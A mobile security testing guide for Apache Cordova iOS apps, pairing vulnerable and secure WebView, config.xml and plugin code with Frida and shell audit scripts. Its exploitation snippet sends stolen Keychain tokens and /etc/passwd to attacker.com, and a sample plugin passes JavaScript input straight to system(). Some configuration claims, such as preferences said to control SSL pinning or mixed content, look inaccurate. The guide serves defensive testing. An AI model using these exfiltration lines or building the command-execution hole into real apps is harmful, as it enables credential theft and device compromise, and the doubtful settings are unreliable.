# Cordova iOS Security

Apache Cordova enables building iOS apps using HTML, CSS, and JavaScript. This hybrid web-native architecture introduces unique security challenges requiring specialized testing approaches for iOS deployments.

## Architecture Overview

### Cordova iOS Bridge

```
Web Layer (HTML/CSS/JavaScript)
           ↓
      CDVViewController
           ↓
      Cordova Bridge
           ↓
   Native Plugins (Objective-C/Swift)
           ↓
   iOS APIs (UIKit, Foundation, etc.)
```

**MASTG References:**
- MASTG-TEST-0001: Information Gathering
- MASTG-TEST-0038: Local Data Storage Analysis
- MASTG-TEST-0045: WebView Communication
- MASTG-TEST-0053: Testing for Custom URL Schemes

## 1. CDVWebViewEngine

### Detection

```bash
# Check if app uses Cordova
strings Payload/*.app/* | grep -i "cordova"

# Find CDVViewController
strings Payload/*.app/* | grep "CDVViewController"

# Check WebView engine
strings Payload/*.app/* | grep -E "WKWebView|UIWebView"
```

### Frida Detection

```javascript
// Detect Cordova iOS app
if (ObjC.available) {
    try {
        const CDVViewController = ObjC.classes.CDVViewController;

        if (CDVViewController) {
            console.log("[+] Cordova App Detected");

            // Get Cordova version
            const version = ObjC.classes.CDVVersion;
            if (version) {
                console.log(`    Version: ${version['- version']().toString()}`);
            }

            // Check WebView engine
            try {
                const WKWebView = ObjC.classes.WKWebView;
                if (WKWebView) {
                    console.log("    WebView Engine: WKWebView");
                }
            } catch (e) {
                console.log("    WebView Engine: UIWebView (DEPRECATED)");
            }
        } else {
            console.log("[-] Not a Cordova app");
        }
    } catch (e) {
        console.log("[-] Error detecting Cordova: " + e);
    }
}
```

### Vulnerability: WebView Configuration

```objective-c
// Vulnerable WebView configuration
// AppDelegate.m

- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {

    CDVViewController* viewController = [CDVViewController new];

    // VULNERABLE: Enables remote debugging
    viewController.webViewEngine.configuration.preferences setValue:@YES
                                                      forKey:@"developerExtrasEnabled"];

    // VULNERABLE: Allows file access
    viewController.webViewEngine.configuration.preferences setValue:@YES
                                                      forKey:@"allowFileAccessFromFileURLs"];

    // VULNERABLE: Allows universal access
    viewController.webViewEngine.configuration.preferences setValue:@YES
                                                      forKey:@"allowUniversalAccessFromFileURLs"];

    return [super application:application didFinishLaunchingWithOptions:launchOptions];
}
```

### Secure WebView Configuration

```objective-c
// Secure WebView configuration
- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {

    CDVViewController* viewController = [CDVViewController new];

    // Disable developer extras in production
    #ifdef DEBUG
        [viewController.webViewEngine.configuration.preferences setValue:@YES
                                                          forKey:@"developerExtrasEnabled"];
    #endif

    // Disable file access from file URLs
    [viewController.webViewEngine.configuration.preferences setValue:@NO
                                                      forKey:@"allowFileAccessFromFileURLs"];

    // Disable universal access
    [viewController.webViewEngine.configuration.preferences setValue:@NO
                                                      forKey:@"allowUniversalAccessFromFileURLs"];

    // Enable mixed content blocking
    [viewController.webViewEngine.configuration.preferences setValue:@NO
                                                      forKey:@"allowInlineMediaPlayback"];

    // Enable content security policy
    viewController.webViewEngine.configuration.userContentController = [WKUserContentController new];

    NSString *csp = @"default-src 'self'; script-src 'self'; "
                   @"style-src 'self' 'unsafe-inline'; "
                   @"img-src 'self' data: https:; "
                   @"font-src 'self' data:;";

    WKUserScript *cspScript = [[WKUserScript alloc] initWithSource:[NSString stringWithFormat:
        @"var meta = document.createElement('meta');"
        @"meta.httpEquiv = 'Content-Security-Policy';"
        @"meta.content = '%@';"
        @"document.head.appendChild(meta);", csp]
        injectionTime:WKUserScriptInjectionTimeAtDocumentStart
        forMainFrameOnly:YES];

    [viewController.webViewEngine.configuration.userContentController addUserScript:cspScript];

    return [super application:application didFinishLaunchingWithOptions:launchOptions];
}
```

## 2. config.xml iOS Settings

### Vulnerable config.xml

```xml
<?xml version='1.0' encoding='utf-8'?>
<widget id="com.example.app" version="1.0.0" xmlns="http://www.w3.org/ns/widgets">

    <!-- VULNERABLE: Allows arbitrary loads -->
    <preference name="AllowInlineMediaPlayback" value="true" />
    <preference name="MediaPlaybackRequiresUserAction" value="false" />

    <!-- VULNERABLE: Enables remote debugging -->
    <preference name="WebViewDebuggingEnabled" value="true" />

    <!-- VULNERABLE: Allows file access -->
    <preference name="AllowFileAccessFromFileURLs" value="true" />
    <preference name="AllowUniversalAccessFromFileURLs" value="true" />

    <!-- VULNERABLE: Disables SSL pinning -->
    <preference name="CordovaWebViewEngine" value="CDVWebViewEngine" />
    <preference name="AllowCertificateTrust" value="true" />

    <!-- VULNERABLE: Insecure content loading -->
    <access origin="*" />
    <access origin="http://*" />

    <!-- VULNERABLE: Exposes sensitive plugins -->
    <feature name="InAppBrowser">
        <param name="ios-package" value="CDVInAppBrowser" />
    </feature>

    <feature name="LocalStorage">
        <param name="ios-package" value="CDVLocalStorage" />
    </feature>

    <feature name="File">
        <param name="ios-package" value="CDVFile" />
    </feature>

    <!-- Dangerous intent filters -->
    <allow-intent href="tel:*" />
    <allow-intent href="sms:*" />
    <allow-intent href="mailto:*" />
    <allow-intent href="geo:*" />

</widget>
```

### Secure config.xml

```xml
<?xml version='1.0' encoding='utf-8'?>
<widget id="com.example.app" version="1.0.0" xmlns="http://www.w3.org/ns/widgets">

    <!-- Secure WebView configuration -->
    <preference name="AllowInlineMediaPlayback" value="false" />
    <preference name="MediaPlaybackRequiresUserAction" value="true" />

    <!-- Remote debugging only in development -->
    <preference name="WebViewDebuggingEnabled" value="false" />

    <!-- Disable file access -->
    <preference name="AllowFileAccessFromFileURLs" value="false" />
    <preference name="AllowUniversalAccessFromFileURLs" value="false" />

    <!-- Enable SSL validation -->
    <preference name="CordovaWebViewEngine" value="CDVWKWebViewEngine" />
    <preference name="AllowCertificateTrust" value="false" />

    <!-- Restrict access to specific domains -->
    <access origin="https://api.example.com" />
    <access origin="https://cdn.example.com" />

    <!-- Secure intent filters -->
    <allow-intent href="tel:1234567890" />
    <allow-intent href="mailto:support@example.com" />
    <allow-intent href="geo:37.7749,-122.4194" />

    <!-- Content Security Policy -->
    <platform name="ios">
        <preference name="Orientation" value="portrait" />
        <preference name="KeyboardDisplayRequiresUserAction" value="true" />
    </platform>

</widget>
```

### Automated config.xml Analysis

```bash
#!/bin/bash
# audit_cordova_config.sh

CONFIG_XML=$1

if [ -z "$CONFIG_XML" ]; then
    echo "Usage: $0 <config.xml>"
    exit 1
fi

echo "[*] Auditing Cordova config.xml..."

# Check for WebViewDebuggingEnabled
if grep -q "WebViewDebuggingEnabled.*true" "$CONFIG_XML"; then
    echo "[!] CRITICAL: Remote debugging enabled in production"
fi

# Check for AllowCertificateTrust
if grep -q "AllowCertificateTrust.*true" "$CONFIG_XML"; then
    echo "[!] CRITICAL: SSL certificate validation disabled"
fi

# Check for wildcard access
if grep -q 'access origin="\*"' "$CONFIG_XML"; then
    echo "[!] WARNING: Wildcard access origin configured"
fi

# Check for file access
if grep -q "AllowFileAccessFromFileURLs.*true" "$CONFIG_XML"; then
    echo "[!] WARNING: File access from file URLs allowed"
fi

# Check for universal access
if grep -q "AllowUniversalAccessFromFileURLs.*true" "$CONFIG_XML"; then
    echo "[!] WARNING: Universal access from file URLs allowed"
fi

# List all features
echo "[*] Configured features:"
grep -A1 "<feature" "$CONFIG_XML" | grep "param name" | sed 's/.*value="//;s/".*//' | sort -u

# List all preferences
echo "[*] Preferences:"
grep "<preference" "$CONFIG_XML" | sed 's/.*name="//;s/".*//' | sort -u
```

## 3. Plugin Security

### Vulnerable Plugin Implementation

```objective-c
// Vulnerable Cordova plugin
// MySecurePlugin.m

#import <Cordova/CDV.h>
#import <Security/Security.h>

@interface MySecurePlugin : CDVPlugin
@end

@implementation MySecurePlugin

// VULNERABLE: No input validation
- (void)saveToKeychain:(CDVInvokedUrlCommand*)command {
    NSString *key = [command.arguments objectAtIndex:0];
    NSString *value = [command.arguments objectAtIndex:1];

    // Direct Keychain access - vulnerable to injection
    NSDictionary *attributes = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrAccount: key,
        (__bridge id)kSecValueData: [value dataUsingEncoding:NSUTF8StringEncoding]
    };

    SecItemAdd((__bridge CFDictionaryRef)attributes, NULL);

    CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_OK];
    [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
}

// VULNERABLE: Returns sensitive data to JavaScript
- (void)readFromKeychain:(CDVInvokedUrlCommand*)command {
    NSString *key = [command.arguments objectAtIndex:0];

    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrAccount: key,
        (__bridge id)kSecReturnData: @YES
    };

    CFTypeRef result = NULL;
    SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);

    if (result) {
        NSData *data = (__bridge NSData *)result;
        NSString *value = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

        // Returns sensitive data to JavaScript
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_OK
                                                      messageAsString:value];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
    }
}

// VULNERABLE: Executes arbitrary commands
- (void)executeCommand:(CDVInvokedUrlCommand*)command {
    NSString *commandString = [command.arguments objectAtIndex:0];

    // Executes arbitrary shell commands - CRITICAL VULNERABILITY
    system([commandString UTF8String]);

    CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_OK];
    [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
}

@end
```

### Exploitation

```javascript
// JavaScript code to exploit vulnerable plugin
const MySecurePlugin = cordova.require('cordova-plugin-mysecure.MySecurePlugin');

// Steal all Keychain data
const keys = ['auth_token', 'api_key', 'password', 'session'];

keys.forEach((key) => {
    MySecurePlugin.readFromKeychain([key], (value) => {
        if (value) {
            fetch('https://attacker.com/exfil', {
                method: 'POST',
                body: JSON.stringify({ key, value })
            });
        }
    });
});

// Execute arbitrary commands
MySecurePlugin.executeCommand(['cat /etc/passwd | curl -X POST -d @- https://attacker.com/data']);
```

### Secure Plugin Implementation

```objective-c
// Secure Cordova plugin
#import <Cordova/CDV.h>
#import <Security/Security.h>

@interface SecureMyPlugin : CDVPlugin
@end

@implementation SecureMyPlugin

// Secure: With input validation and sanitization
- (void)saveToKeychain:(CDVInvokedUrlCommand*)command {
    // Validate arguments
    if (command.arguments.count < 2) {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR
                                                          messageAsString:@"Missing arguments"];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
        return;
    }

    NSString *key = [command.arguments objectAtIndex:0];
    NSString *value = [command.arguments objectAtIndex:1];

    // Validate inputs
    if (!key || key.length == 0 || key.length > 100) {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR
                                                          messageAsString:@"Invalid key"];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
        return;
    }

    if (!value || value.length == 0) {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR
                                                          messageAsString:@"Invalid value"];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
        return;
    }

    // Sanitize key to prevent injection
    NSCharacterSet *allowedChars = [NSCharacterSet characterSetWithCharactersInString:@"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"];
    if ([key rangeOfCharacterFromSet:[allowedChars invertedSet]].location != NSNotFound) {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR
                                                          messageAsString:@"Invalid key format"];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
        return;
    }

    // Enforce kSecAttrAccessibleWhenUnlocked
    NSDictionary *attributes = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrAccount: key,
        (__bridge id)kSecValueData: [value dataUsingEncoding:NSUTF8StringEncoding],
        (__bridge id)kSecAttrAccessible: (__bridge id)kSecAttrAccessibleWhenUnlocked
    };

    OSStatus status = SecItemAdd((__bridge CFDictionaryRef)attributes, NULL);

    if (status == errSecSuccess || status == errSecDuplicateItem) {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_OK];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
    } else {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR
                                                      messageAsString:@"Failed to save"];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
    }
}

// Secure: With proper access control
- (void)readFromKeychain:(CDVInvokedUrlCommand*)command {
    // Validate arguments
    if (command.arguments.count < 1) {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR
                                                          messageAsString:@"Missing arguments"];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
        return;
    }

    NSString *key = [command.arguments objectAtIndex:0];

    // Validate key
    if (!key || key.length == 0 || key.length > 100) {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR
                                                          messageAsString:@"Invalid key"];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
        return;
    }

    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrAccount: key,
        (__bridge id)kSecReturnData: @YES
    };

    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);

    if (status == errSecSuccess && result) {
        NSData *data = (__bridge NSData *)result;
        NSString *value = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_OK
                                                      messageAsString:value];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
    } else {
        CDVPluginResult *pluginResult = [CDVPluginResult resultWithStatus:CDVCommandStatus_ERROR
                                                      messageAsString:@"Item not found"];
        [self.commandDelegate sendPluginResult:pluginResult callbackId:command.callbackId];
    }
}

// REMOVED: executeCommand method (too dangerous)
@end
```

## 4. www/ Directory Exposure

### Detection

```bash
# Find www/ directory in IPA
unzip -q app.ipa
cd Payload/*.app

# Check for www/ directory
if [ -d "www" ]; then
    echo "[+] www/ directory found"
    ls -la www/

    # Check for sensitive files
    echo "[*] Checking for sensitive files in www/"
    find www -type f -name "*.js" -o -name "*.json" -o -name "*.config" | head -20

    # Check for hardcoded secrets
    echo "[*] Searching for hardcoded secrets..."
    grep -r "api_key\|password\|secret\|token" www/ | head -10
fi
```

### Vulnerability: Source Code Exposure

```javascript
// Vulnerable: Hardcoded secrets in JavaScript
// www/js/app.js

const API_KEY = "AIzaSyABC123XYZ"; // Hardcoded API key
const API_URL = "https://api.example.com";

const login = async (username, password) => {
    const response = await fetch(`${API_URL}/login`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-API-Key': API_KEY
        },
        body: JSON.stringify({ username, password })
    });

    const data = await response.json();

    // Store token in localStorage (insecure)
    localStorage.setItem('auth_token', data.token);
    localStorage.setItem('user_password', password); // NEVER store password

    return data;
};

// Exposes sensitive configuration
const config = {
    apiKey: API_KEY,
    endpoint: API_URL,
    debug: true // Debug mode enabled in production
};
```

### Extraction of Source Code

```bash
#!/bin/bash
# extract_cordova_source.sh

IPA_PATH=$1
EXTRACT_DIR=$2

if [ -z "$IPA_PATH" ] || [ -z "$EXTRACT_DIR" ]; then
    echo "Usage: $0 <ipa_path> <extract_dir>"
    exit 1
fi

mkdir -p "$EXTRACT_DIR"

# Unzip IPA
echo "[*] Extracting IPA..."
unzip -q "$IPA_PATH" -d "$EXTRACT_DIR"

# Find app bundle
APP_PATH=$(find "$EXTRACT_DIR/Payload" -name "*.app" -type d | head -1)

if [ -z "$APP_PATH" ]; then
    echo "[-] App bundle not found"
    exit 1
fi

echo "[+] Found app: $APP_PATH"

# Check for www/ directory
if [ -d "$APP_PATH/www" ]; then
    echo "[+] www/ directory found"

    # Copy www/ directory
    cp -r "$APP_PATH/www" "$EXTRACT_DIR/"

    echo "[*] Analyzing source code..."

    # Count files
    JS_COUNT=$(find "$EXTRACT_DIR/www" -name "*.js" | wc -l)
    HTML_COUNT=$(find "$EXTRACT_DIR/www" -name "*.html" | wc -l)
    CSS_COUNT=$(find "$EXTRACT_DIR/www" -name "*.css" | wc -l)

    echo "[+] Found $JS_COUNT JS files, $HTML_COUNT HTML files, $CSS_COUNT CSS files"

    # Search for secrets
    echo "[*] Searching for secrets..."
    grep -r -i "api[_-]?key\|password\|secret\|token\|credential" "$EXTRACT_DIR/www" \
        | grep -v "node_modules" \
        | head -20 > "$EXTRACT_DIR/secrets.txt"

    if [ -s "$EXTRACT_DIR/secrets.txt" ]; then
        echo "[!] Found potential secrets:"
        head -10 "$EXTRACT_DIR/secrets.txt"
    else
        echo "[+] No obvious secrets found"
    fi

    # Extract URLs
    echo "[*] Extracting URLs..."
    grep -r -oE "https?://[a-zA-Z0-9./?=_-]+" "$EXTRACT_DIR/www" \
        | grep -v "node_modules" \
        | sort -u > "$EXTRACT_DIR/urls.txt"

    URL_COUNT=$(wc -l < "$EXTRACT_DIR/urls.txt")
    echo "[+] Found $URL_COUNT unique URLs"

    # Check for debug code
    echo "[*] Checking for debug code..."
    grep -r -i "console\\.log\|debugger\|debug.*true" "$EXTRACT_DIR/www" \
        | grep -v "node_modules" | head -10 > "$EXTRACT_DIR/debug.txt"

    if [ -s "$EXTRACT_DIR/debug.txt" ]; then
        echo "[!] Found debug code:"
        head -10 "$EXTRACT_DIR/debug.txt"
    fi
else
    echo "[-] www/ directory not found (code might be compiled/minified)"
fi

echo "[+] Analysis complete: $EXTRACT_DIR"
```

## 5. WKWebView vs UIWebView Migration

### UIWebView Deprecation

**UIWebView was deprecated in iOS 12 (2018) and completely removed in iOS 14 (2020).**

Apps still using UIWebView will be rejected by Apple App Store.

### Detection

```javascript
// Check which WebView engine is used
if (ObjC.available) {
    try {
        const UIWebView = ObjC.classes.UIWebView;
        const WKWebView = ObjC.classes.WKWebView;

        if (UIWebView && !UIWebView.toString().includes('null')) {
            console.log("[!] CRITICAL: UIWebView detected - DEPRECATED and REMOVED");
        }

        if (WKWebView) {
            console.log("[+] WKWebView detected - Current and secure");
        }

        // Check for WKWebView usage in Cordova
        const CDVWKWebViewEngine = ObjC.classes.CDVWKWebViewEngine;
        if (CDVWKWebViewEngine) {
            console.log("[+] Using CDVWKWebViewEngine (Cordova WKWebView plugin)");
        }

        // Check for UIWebView plugin
        const CDVUIWebViewEngine = ObjC.classes.CDVUIWebViewEngine;
        if (CDVUIWebViewEngine) {
            console.log("[!] CRITICAL: Using CDVUIWebViewEngine - DEPRECATED");
        }
    } catch (e) {
        console.log("[-] Error detecting WebView engine: " + e);
    }
}
```

### Migrating to WKWebView

```xml
<!-- Old config.xml using UIWebView -->
<preference name="CordovaWebViewEngine" value="CDVWebViewEngine" />
<preference name="UIWebViewDecelerationSpeed" value="fast" />

<!-- New config.xml using WKWebView -->
<preference name="CordovaWebViewEngine" value="CDVWKWebViewEngine" />
<preference name="WKWebViewOnly" value="true" />
```

## Testing Checklist

### WebView Configuration
- [ ] Detect WebView engine (WKWebView vs UIWebView)
- [ ] Check for remote debugging enabled
- [ ] Verify file access restrictions
- [ ] Test Content Security Policy
- [ ] Check for mixed content handling

### config.xml Security
- [ ] Audit all preferences for security issues
- [ ] Check for wildcard access origins
- [ ] Verify SSL certificate validation
- [ ] Review intent filters
- [ ] Check for dangerous features

### Plugin Security
- [ ] Enumerate all installed plugins
- [ ] Review plugin implementations
- [ ] Test for input validation
- [ ] Check for sensitive data exposure
- [ ] Verify error handling

### Source Code Security
- [ ] Extract and analyze www/ directory
- [ ] Search for hardcoded secrets
- [ ] Check for debug code
- [ ] Review API keys and endpoints
- [ ] Analyze client-side validation

### Local Storage
- [ ] Analyze localStorage usage
- [ ] Check sessionStorage
- [ ] Review IndexedDB
- [ ] Test for sensitive data storage
- [ ] Verify encryption

### Network Security
- [ ] Test SSL pinning
- [ ] Verify ATS configuration
- [ ] Check for certificate validation
- [ ] Test for mixed content
- [ ] Review API security

## OWASP MASTG References

- **MASTG-TEST-0001**: Information Gathering
- **MASTG-TEST-0038**: Local Data Storage Analysis
- **MASTG-TEST-0045**: WebView Communication
- **MASTG-TEST-0046**: Testing for Local Storage
- **MASTG-TEST-0050**: Testing Network Communication
- **MASTG-TEST-0051**: Testing Endpoint Transport Security
- **MASTG-TEST-0053**: Testing for Custom URL Schemes
- **MASTG-TEST-0073**: Testing WebView Protocols
- **MASTG-TEST-0077**: Testing for WebView Cache
- **MASTG-TEST-0083**: Testing Binary Protection

## Tools and Resources

### Analysis Tools
- **Frida**: Runtime instrumentation
- **objection**: Runtime exploration
- **MobSF**: Automated security testing
- **Cordova CLI**: Plugin management
- **iOS App Inspector**: iOS app analysis

### Reference Materials
- [Cordova Security Guide](https://cordova.apache.org/docs/en/latest/guide/appdev/security/)
- [OWASP MASTG](https://github.com/OWASP/MASTG)
- [WKWebView Migration Guide](https://developer.apple.com/documentation/webkit/wkwebview)
- [Cordova iOS Platform Guide](https://cordova.apache.org/docs/en/latest/guide/platforms/ios/)
